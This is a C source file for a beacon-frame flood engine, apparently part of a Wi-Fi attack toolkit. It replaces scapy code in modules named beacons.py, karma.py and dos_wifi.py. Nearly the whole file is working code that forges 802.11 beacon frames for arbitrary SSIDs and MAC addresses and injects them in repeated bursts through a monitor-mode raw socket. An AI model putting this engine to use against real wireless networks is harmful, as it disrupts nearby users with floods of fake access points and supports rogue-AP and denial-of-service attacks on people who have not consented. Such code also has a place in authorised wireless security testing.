/**
 * beacon_flood.c - High-speed beacon frame builder and flood engine
 *
 * Constructs and injects 802.11 beacon management frames with RadioTap
 * headers for raw injection via monitor mode interfaces. Replaces per-frame
 * scapy sendp() calls in beacons.py, karma.py, and dos_wifi.py.
 *
 * Linux-only. No external dependencies beyond libc.
 *
 * Compile: gcc -std=c11 -shared -fPIC -o libbeacon_flood.so beacon_flood.c packet_engine.c
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include "beacon_flood.h"
#include "packet_engine.h"

/* ==================== 802.11 Beacon Frame Constants ==================== */

/*
 * Minimal RadioTap header (8 bytes):
 *   version:  0
 *   pad:      0
 *   len:      8 (little-endian)
 *   present:  0x00000000 (no fields present)
 */
#define RADIOTAP_HDR_SIZE 8

static const uint8_t RADIOTAP_HDR[RADIOTAP_HDR_SIZE] = {
    0x00,                   /* it_version */
    0x00,                   /* it_pad */
    0x08, 0x00,             /* it_len (8, little-endian) */
    0x00, 0x00, 0x00, 0x00  /* it_present (no fields) */
};

/*
 * 802.11 Frame Control for Beacon:
 *   type=0 (management), subtype=8 (beacon)
 *   FC = 0x0080 (little-endian: 0x80, 0x00)
 */
#define FC_BEACON_BYTE0    0x80
#define FC_BEACON_BYTE1    0x00

/* Duration field (0 for beacons) */
#define DURATION_BYTE0     0x00
#define DURATION_BYTE1     0x00

/* Broadcast MAC address (destination for beacons) */
static const uint8_t BROADCAST_MAC[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

/*
 * Beacon fixed parameters (12 bytes):
 *   Timestamp:        8 bytes (set to 0, driver fills)
 *   Beacon Interval:  2 bytes (0x0064 = 100 TU = ~102.4ms)
 *   Capability Info:  2 bytes (0x2105 = ESS + Short Preamble + Short Slot Time + Privacy)
 */
#define BEACON_FIXED_SIZE  12

static const uint8_t BEACON_FIXED[BEACON_FIXED_SIZE] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  /* Timestamp */
    0x64, 0x00,                                        /* Beacon Interval (100 TU) */
    0x05, 0x21                                         /* Capability: ESS+ShortPreamble+ShortSlot+Privacy */
};

/* Information Element IDs */
#define IE_SSID     0
#define IE_RATES    1
#define IE_DS       3

/* Supported rates (802.11g): 6,9,12,18,24,36,48,54 Mbps */
static const uint8_t SUPPORTED_RATES[] = {
    0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c
};
#define SUPPORTED_RATES_LEN 8

/* Maximum SSID length per 802.11 spec */
#define MAX_SSID_LEN 32

/*
 * Maximum single beacon frame size:
 *   RadioTap(8) + FC(2) + Duration(2) + Addr1(6) + Addr2(6) + Addr3(6) +
 *   SeqCtrl(2) + BeaconFixed(12) + SSID IE(2+32) + Rates IE(2+8) + DS IE(2+1) = 89
 *   Round up to 128 for safety.
 */
#define MAX_BEACON_FRAME_SIZE 128

/* ==================== Public API ==================== */

/**
 * Build a beacon frame with RadioTap header.
 *
 * Frame structure:
 *   [8]  RadioTap header
 *   [2]  Frame Control (beacon: 0x0080)
 *   [2]  Duration/ID (0)
 *   [6]  Address 1 (destination: broadcast)
 *   [6]  Address 2 (source: src_mac / BSSID)
 *   [6]  Address 3 (BSSID: src_mac)
 *   [2]  Sequence Control (0, driver fills)
 *   [12] Beacon fixed params (timestamp + interval + capability)
 *   [2+N] SSID Information Element
 *   [2+8] Supported Rates IE
 *   [2+1] DS Parameter Set IE (channel)
 *
 * @param buf       Output buffer
 * @param buf_size  Size of output buffer
 * @param src_mac   Source/BSSID MAC address (6 bytes)
 * @param ssid      SSID string (null-terminated, max 32 chars)
 * @param channel   WiFi channel number (1-14)
 * @return          Total frame length written, 0 on error
 */
__attribute__((visibility("default")))
size_t build_beacon(uint8_t *buf, size_t buf_size,
                    const uint8_t *src_mac,
                    const char *ssid, uint8_t channel)
{
    size_t offset = 0;
    size_t ssid_len;

    if (!buf || !src_mac || !ssid) {
        errno = EINVAL;
        return 0;
    }

    ssid_len = strlen(ssid);
    if (ssid_len > MAX_SSID_LEN) {
        ssid_len = MAX_SSID_LEN;
    }

    /* Calculate total frame size */
    size_t total = RADIOTAP_HDR_SIZE + 2 + 2 + 6 + 6 + 6 + 2 +
                   BEACON_FIXED_SIZE +
                   (2 + ssid_len) +
                   (2 + SUPPORTED_RATES_LEN) +
                   (2 + 1);

    if (buf_size < total) {
        errno = ENOBUFS;
        return 0;
    }

    /* RadioTap header */
    memcpy(buf + offset, RADIOTAP_HDR, RADIOTAP_HDR_SIZE);
    offset += RADIOTAP_HDR_SIZE;

    /* Frame Control: Beacon */
    buf[offset++] = FC_BEACON_BYTE0;
    buf[offset++] = FC_BEACON_BYTE1;

    /* Duration/ID */
    buf[offset++] = DURATION_BYTE0;
    buf[offset++] = DURATION_BYTE1;

    /* Address 1: Destination (broadcast) */
    memcpy(buf + offset, BROADCAST_MAC, 6);
    offset += 6;

    /* Address 2: Source (src_mac) */
    memcpy(buf + offset, src_mac, 6);
    offset += 6;

    /* Address 3: BSSID (src_mac) */
    memcpy(buf + offset, src_mac, 6);
    offset += 6;

    /* Sequence Control (0x0000 - driver/firmware handles) */
    buf[offset++] = 0x00;
    buf[offset++] = 0x00;

    /* Beacon Fixed Parameters (timestamp + interval + capability) */
    memcpy(buf + offset, BEACON_FIXED, BEACON_FIXED_SIZE);
    offset += BEACON_FIXED_SIZE;

    /* SSID Information Element */
    buf[offset++] = IE_SSID;
    buf[offset++] = (uint8_t)ssid_len;
    memcpy(buf + offset, ssid, ssid_len);
    offset += ssid_len;

    /* Supported Rates Information Element */
    buf[offset++] = IE_RATES;
    buf[offset++] = SUPPORTED_RATES_LEN;
    memcpy(buf + offset, SUPPORTED_RATES, SUPPORTED_RATES_LEN);
    offset += SUPPORTED_RATES_LEN;

    /* DS Parameter Set (channel) */
    buf[offset++] = IE_DS;
    buf[offset++] = 1;
    buf[offset++] = channel;

    return offset;
}

/**
 * Build multiple beacon frames for a list of SSIDs.
 *
 * Writes frames contiguously into buf. Each frame's length is stored
 * in frame_lens[i]. Stops when buf is full or max_frames reached.
 *
 * @param buf          Output buffer for all frames
 * @param buf_size     Total buffer capacity
 * @param frame_lens   Output array of frame lengths (caller allocates)
 * @param max_frames   Maximum number of frames to build
 * @param src_mac      Source/BSSID MAC (6 bytes)
 * @param ssids        Array of SSID strings
 * @param ssid_count   Number of SSIDs in array
 * @param channel      WiFi channel number
 * @return             Number of frames built
 */
__attribute__((visibility("default")))
int build_beacon_batch(uint8_t *buf, size_t buf_size,
                       size_t *frame_lens, int max_frames,
                       const uint8_t *src_mac,
                       const char **ssids, int ssid_count,
                       uint8_t channel)
{
    int count = 0;
    size_t offset = 0;

    if (!buf || !frame_lens || !src_mac || !ssids || ssid_count <= 0 || max_frames <= 0) {
        errno = EINVAL;
        return 0;
    }

    for (int i = 0; i < ssid_count && count < max_frames; i++) {
        if (!ssids[i]) {
            continue;
        }

        size_t remaining = buf_size - offset;
        if (remaining < MAX_BEACON_FRAME_SIZE) {
            break; /* Not enough space for another frame */
        }

        size_t frame_len = build_beacon(buf + offset, remaining,
                                        src_mac, ssids[i], channel);
        if (frame_len == 0) {
            continue; /* Skip on error */
        }

        frame_lens[count] = frame_len;
        offset += frame_len;
        count++;
    }

    return count;
}

/**
 * Send pre-built beacon frames in a tight loop via raw socket.
 *
 * Iterates over contiguous frame data in buf, sending each frame
 * using send_frame() from packet_engine.
 *
 * @param sock_fd      Raw socket fd (from init_raw_socket)
 * @param buf          Buffer containing contiguous frames
 * @param frame_lens   Array of frame lengths
 * @param frame_count  Number of frames in buffer
 * @return             Number of frames sent, -1 on fatal error
 */
__attribute__((visibility("default")))
int flood_beacons(int sock_fd, const uint8_t *buf,
                  const size_t *frame_lens, int frame_count)
{
    int sent = 0;
    size_t offset = 0;

    if (sock_fd < 0 || !buf || !frame_lens || frame_count <= 0) {
        errno = EINVAL;
        return -1;
    }

    for (int i = 0; i < frame_count; i++) {
        if (frame_lens[i] == 0) {
            continue;
        }

        if (send_frame(sock_fd, buf + offset, frame_lens[i]) == 0) {
            sent++;
        }
        offset += frame_lens[i];
    }

    return sent;
}

/**
 * High-level beacon flood: build + send beacons for all SSIDs.
 *
 * Opens a raw socket on the specified interface, builds beacon frames
 * for all provided SSIDs, then sends the entire batch burst_count times.
 *
 * @param iface        Monitor mode interface name (e.g., "wlan0mon")
 * @param src_mac      Source/BSSID MAC (6 bytes)
 * @param ssids        Array of SSID strings
 * @param ssid_count   Number of SSIDs
 * @param channel      WiFi channel (1-14)
 * @param burst_count  Number of times to send the full batch
 * @return             Total frames sent, -1 on error
 */
__attribute__((visibility("default")))
int beacon_flood(const char *iface, const uint8_t *src_mac,
                 const char **ssids, int ssid_count,
                 uint8_t channel, int burst_count)
{
    int sock_fd;
    int total_sent = 0;

    if (!iface || !src_mac || !ssids || ssid_count <= 0 || burst_count <= 0) {
        errno = EINVAL;
        return -1;
    }

    /* Open raw socket */
    sock_fd = init_raw_socket(iface);
    if (sock_fd < 0) {
        return -1;
    }

    /* Allocate frame buffer: MAX_BEACON_FRAME_SIZE * ssid_count */
    size_t buf_size = (size_t)ssid_count * MAX_BEACON_FRAME_SIZE;
    uint8_t buf[buf_size];
    size_t frame_lens[ssid_count];

    /* Build all beacon frames */
    int frame_count = build_beacon_batch(buf, buf_size, frame_lens, ssid_count,
                                         src_mac, ssids, ssid_count, channel);
    if (frame_count <= 0) {
        close_raw_socket(sock_fd);
        return -1;
    }

    /* Send the batch burst_count times */
    for (int burst = 0; burst < burst_count; burst++) {
        int sent = flood_beacons(sock_fd, buf, frame_lens, frame_count);
        if (sent < 0) {
            close_raw_socket(sock_fd);
            return total_sent > 0 ? total_sent : -1;
        }
        total_sent += sent;
    }

    close_raw_socket(sock_fd);
    return total_sent;
}
